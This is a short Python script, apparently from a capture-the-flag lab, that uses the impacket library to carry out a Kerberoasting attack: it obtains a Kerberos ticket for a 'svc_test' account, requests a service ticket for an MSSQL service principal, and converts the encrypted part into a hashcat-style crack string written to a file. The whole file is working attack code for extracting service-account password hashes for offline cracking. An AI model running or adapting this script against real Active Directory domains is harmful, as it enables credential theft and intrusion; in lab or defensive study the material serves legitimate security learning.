from binascii import hexlify
from pyasn1.codec.der import decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal

realm='OLD.VELOCITY.HACKLU'; kdc='10.244.0.20'
client=Principal('svc_test',type=constants.PrincipalNameType.NT_PRINCIPAL.value)
tgt,cipher,old_session,session=getKerberosTGT(client,'svc_test',realm,None,None,kdcHost=kdc)
spn='MSSQLSvc/svc_granite_sync.'
service=Principal(spn,type=constants.PrincipalNameType.NT_SRV_INST.value)
tgs,cipher,old_session,session=getKerberosTGS(service,realm,kdc,tgt,cipher,session)
rep=decoder.decode(tgs,asn1Spec=TGS_REP())[0]
etype=int(rep['ticket']['enc-part']['etype']); data=rep['ticket']['enc-part']['cipher'].asOctets()
if etype==constants.EncryptionTypes.rc4_hmac.value:
    line=f'$krb5tgs$23$*svc_granite_sync${realm}${spn}*${hexlify(data[:16]).decode()}${hexlify(data[16:]).decode()}'
elif etype in (constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
    line=f'$krb5tgs${etype}$svc_granite_sync${realm}$*{spn}*${hexlify(data[-12:]).decode()}${hexlify(data[:-12]).decode()}'
else:
    raise RuntimeError(f'unsupported TGS enctype {etype}')
print('service_principal=',rep['ticket']['sname'])
print('enctype=',etype)
print(line)
open('/mnt/c/Users/m/Downloads/.ctf-workbench/ad13-ma/challenges/AD-13/kerberoast.hash','w').write(line+'\n')
